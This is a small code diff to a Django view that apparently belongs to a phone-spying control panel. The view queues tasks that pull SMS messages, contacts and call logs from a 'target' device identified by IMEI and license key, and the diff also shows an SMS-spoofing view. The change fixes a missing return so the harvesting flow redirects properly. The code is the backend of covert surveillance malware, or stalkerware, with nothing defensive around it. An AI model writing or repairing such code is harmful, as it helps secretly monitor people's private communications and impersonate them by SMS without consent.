@@ -328,16 +328,18 @@ class SyncTargetView(LoginRequiredMixin, InertiaView):
             target = Target.objects.get(status="active", user=user)
         except Target.DoesNotExist:
             return redirect("targets")
-        
+      
         if sync_type == "sms":
             fetch_sms.delay(target.id, target.device_imei, target.license_key)
-            redirect("messages")
+            return redirect("messages")
         elif sync_type == "contacts":
             fetch_contacts_socket.delay(target.id, target.device_imei, target.license_key)
             return redirect("contacts")
         elif sync_type == "call_logs":
             fetch_call_logs_socket.delay(target.id, target.device_imei, target.license_key)
             return redirect("call-logs")
+
+        return redirect("targets")
 
 class SpoofSMSView(LoginRequiredMixin, InertiaView):
     template_name = "SpoofSms"
